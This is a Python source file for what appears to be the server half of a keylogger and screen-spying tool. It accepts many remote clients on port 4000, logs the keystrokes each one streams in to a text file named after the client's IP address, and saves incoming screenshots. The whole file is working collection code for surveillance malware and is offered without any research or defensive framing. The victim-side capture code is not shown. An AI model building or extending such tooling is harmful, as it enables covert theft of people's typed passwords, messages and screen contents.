import socket
import threading
import queue
import os
import time
import select

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # Buffer size for receiving data
SEPARATOR = "<sep>"

clients = []
client_sockets = {}
keypress_queues = {}

# Function to handle client messages, including image data
def handle_client(client_socket, client_address, keypress_queue):
    client_ip = client_address[0]
    print(f"Connection from {client_ip} established!")

    client_address = client_socket.getpeername()[0]
    file_name = f"{client_address}.txt"
    newline_added = False  # Flag to track if a newline has been added
    last_keypress_time = time.time()  # Track the time of the last keypress

    client_socket.settimeout(0.5)  # Set a timeout for the socket (non-blocking)

    while True:
        try:
            # Wait to receive the first message from the client
            data = client_socket.recv(BUFFER_SIZE).decode()
            print(f"Received data: {data}")  # Debug print

            if data == "image":
                # Prepare to receive an image
                client_socket.send("Ready for image".encode())  # Send acknowledgment
                image_size = int(client_socket.recv(1024).decode())  # Get the image size
                client_socket.send("Size received".encode())  # Acknowledge size

                # Receive the image in chunks
                image_data = b""
                while len(image_data) < image_size:
                    packet = client_socket.recv(BUFFER_SIZE)
                    if not packet:  # If the connection is closed
                        break
                    image_data += packet

                # Save the image to a file
                image_filename = f"{client_ip}_screenshot.jpg"
                with open(image_filename, "wb") as image_file:
                    image_file.write(image_data)

                print(f"Image received and saved as {image_filename}")
                client_socket.send("Image received".encode())  # Notify client
            else:
                with open(file_name, 'a') as file:
                    # Check if 5 seconds have passed since the last keypress
                    if time.time() - last_keypress_time >= 5:
                        if not newline_added:
                            keypress_queue.put('\n')
                            file.write('\n')
                            file.flush()  # Make sure the newline is written immediately
                            newline_added = True

                    # Use select to check if data is available to read
                    readable, _, _ = select.select([client_socket], [], [], 0)
                    if readable:
                        keypress = client_socket.recv(BUFFER_SIZE).decode()
                        if not keypress:  # If no keypress (client disconnected)
                            break

                        keypress_queue.put(keypress)
                        file.write(keypress)
                        file.flush()  # Make sure to write immediately
                        newline_added = False  # Reset the flag when something is written
                        last_keypress_time = time.time()  # Update the last keypress time
                        print(f"Received keypress from {client_ip}: {keypress}")  # Debug print
        except Exception as e:
            print(f"Error handling client {client_ip}: {e}")
            break

    client_socket.close()

# Function to start the server and handle incoming connections
def start_server(update_clients_list):
    global s
    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST} on port {SERVER_PORT} ...")

    while True:
        client_socket, client_address = s.accept()
        clients.append(client_address)
        client_sockets[client_address] = client_socket
        keypress_queue = queue.Queue()
        keypress_queues[client_address] = keypress_queue
        update_clients_list(clients)
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        threading.Thread(target=handle_client, args=(client_socket, client_address, keypress_queue)).start()

# Function to stop the server and close all client connections
def stop_server():
    try:
        for client in clients:
            client_sockets[client].close()
        s.close()
    except Exception as e:
        print(f"Error stopping server: {e}")